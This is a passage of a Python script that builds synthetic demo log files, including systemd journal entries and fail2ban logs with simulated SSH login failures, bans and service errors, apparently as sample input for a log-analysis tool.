            "_UID": str(uid),
            "_COMM": identifier,
            "_TRANSPORT": "kernel" if identifier == "kernel" else "syslog",
            "MESSAGE": message,
        }
        if unit:
            entry["_SYSTEMD_UNIT"] = unit
        entries.append(json.dumps(entry))

    add(0, "systemd", "Started ssh.service - OpenBSD Secure Shell server.", unit="init.scope", pid=1)
    for attempt in range(8):
        add(30 + attempt * 3, "sshd", f"Failed password for invalid user {['admin', 'test', 'oracle', 'ubuntu', 'pi', 'git', 'ftp', 'guest'][attempt]} from 203.0.113.66 port {41000 + attempt} ssh2", priority=6, unit="ssh.service", pid=4200)
    add(60, "sshd", "Accepted publickey for alice from 198.51.100.40 port 50122 ssh2: ED25519 SHA256:abc", unit="ssh.service", pid=4210)
    add(90, "sudo", "   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx", pid=4220, uid=1000)
    add(120, "systemd", "nginx.service: Main process exited, code=exited, status=1/FAILURE", priority=4, unit="init.scope", pid=1)
    add(121, "systemd", "Failed to start nginx.service - A high performance web server.", priority=3, unit="init.scope", pid=1)
    add(150, "kernel", "[UFW BLOCK] IN=eth0 OUT= SRC=45.155.205.12 DST=10.0.0.5 LEN=44 PROTO=TCP SPT=51544 DPT=3389 WINDOW=1024 SYN URGP=0", priority=4, pid=0)
    add(151, "kernel", "[UFW BLOCK] IN=eth0 OUT= SRC=45.155.205.12 DST=10.0.0.5 LEN=44 PROTO=TCP SPT=51545 DPT=445 WINDOW=1024 SYN URGP=0", priority=4, pid=0)
    add(180, "kernel", "Out of memory: Killed process 2875 (java) total-vm:8123456kB, anon-rss:4012345kB", priority=3, pid=0)
    add(200, "CRON", "(root) CMD (/usr/local/bin/backup.sh)", unit="cron.service", pid=2300)
    add(240, "myapp", "Payment service timed out after 30 seconds", priority=3, unit="myapp.service", pid=3400, uid=1001)
    entries.insert(5, '{"MESSAGE": "broken journal line on purpose"')
    return "\n".join(entries) + "\n"


def fail2ban_demo() -> str:
    lines = []
    t = BASE

    def add(offset: float, component: str, pid: int, level: str, message: str) -> None:
        moment = t + timedelta(seconds=offset)
        lines.append(f"{moment.strftime('%Y-%m-%d %H:%M:%S')},{int(moment.microsecond / 1000) + random.randint(0, 99):03d} {component:<24} [{pid}]: {level:<8} {message}")

    add(0, "fail2ban.server", 812, "INFO", "Starting Fail2ban v1.1.0")
    add(1, "fail2ban.jail", 812, "INFO", "Creating new jail 'sshd'")
    add(1.5, "fail2ban.jail", 812, "INFO", "Jail 'sshd' started")
    add(2, "fail2ban.jail", 812, "INFO", "Jail 'postfix-sasl' started")
    add(3, "fail2ban.actions", 812, "NOTICE", "[sshd] Restore Ban 192.0.2.99")
    for attempt in range(5):
        add(60 + attempt * 4, "fail2ban.filter", 812, "INFO", f"[sshd] Found 203.0.113.66 - {(t + timedelta(seconds=60 + attempt * 4)).strftime('%Y-%m-%d %H:%M:%S')}")
    add(81, "fail2ban.actions", 812, "NOTICE", "[sshd] Ban 203.0.113.66")
    for attempt in range(5):
        add(300 + attempt * 2, "fail2ban.filter", 812, "INFO", f"[postfix-sasl] Found 203.0.113.66 - {(t + timedelta(seconds=300 + attempt * 2)).strftime('%Y-%m-%d %H:%M:%S')}")
    add(311, "fail2ban.actions", 812, "NOTICE", "[postfix-sasl] Ban 203.0.113.66")
    for attempt in range(3):
        add(400 + attempt * 5, "fail2ban.filter", 812, "INFO", f"[sshd] Found 198.51.100.23 - {(t + timedelta(seconds=400 + attempt * 5)).strftime('%Y-%m-%d %H:%M:%S')}")
    add(420, "fail2ban.filter", 812, "INFO", "[sshd] Ignore 198.51.100.40 by ip")
    add(500, "fail2ban.actions", 812, "WARNING", "[sshd] 203.0.113.66 already banned")
    add(681, "fail2ban.actions", 812, "NOTICE", "[sshd] Unban 192.0.2.99")
    add(700, "fail2ban.actions", 812, "ERROR", "Failed to execute ban jail 'sshd' action 'iptables-multiport': Error banning 198.51.100.200")
    add(3681, "fail2ban.actions", 812, "NOTICE", "[sshd] Unban 203.0.113.66")
    return "\n".join(lines) + "\n"


DEMOS = {
    "windows-security.xml": windows_demo,
    "nginx-access.log": access_demo,
    "nginx-error.log": nginx_error_demo,
    "apache-error.log": apache_error_demo,
    "iis.log": iis_demo,
    "app.jsonl": json_demo,
    "suricata-eve.json": suricata_demo,
    "cloudtrail.json": cloudtrail_demo,
    "cef.log": cef_demo,
    "zeek.log": zeek_demo,
    "linux-auth.log": linux_syslog_demo,
    "audit.log": audit_demo,
    "journal.json": journal_demo,
    "fail2ban.log": fail2ban_demo,
}


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)

    for name, build in DEMOS.items():
        content = build()
        (OUT / name).write_text(content, encoding="utf-8", newline="")
        print(f"{name:24} {len(content) / 1024:7.1f} KB")


if __name__ == "__main__":
    main()
